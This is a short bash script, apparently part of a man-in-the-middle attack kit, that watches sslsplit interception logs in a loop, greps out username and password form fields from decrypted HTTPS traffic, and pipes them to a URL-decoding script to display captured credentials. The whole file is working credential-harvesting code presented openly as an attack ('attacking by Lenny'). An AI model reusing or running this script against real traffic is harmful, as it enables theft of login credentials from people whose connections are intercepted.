#! /bin/bash

cd sslsplit/logdir
echo 'attacking by Lenny....'
sleep 3
clear

while ((1))
do
    clear
    grep -h -R ".*user=.*password=.*" | cut -d "&" -f 2,7 --output-delimiter="     " | python ../../decode_url.py
    grep -h -R ".*acct_name=.*password=.*" | cut -d "&" -f 1,2 --output-delimiter="     " | python ../../decode_url.py
    sleep 1
done
